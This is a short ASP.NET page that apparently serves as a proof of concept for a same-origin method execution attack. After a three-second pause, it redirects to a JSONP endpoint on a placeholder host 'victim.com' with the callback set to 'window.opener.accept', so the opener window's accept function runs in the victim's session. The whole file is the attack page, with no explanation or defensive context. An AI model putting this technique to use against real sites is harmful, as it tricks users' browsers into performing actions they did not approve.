<% @Page Language="C#" %>
<%@ import Namespace="System.Threading" %>
<%

Thread.Sleep(3000);
Response.Redirect("http://victim.com:5050/jsonp.aspx?callback=window.opener.accept");

%>

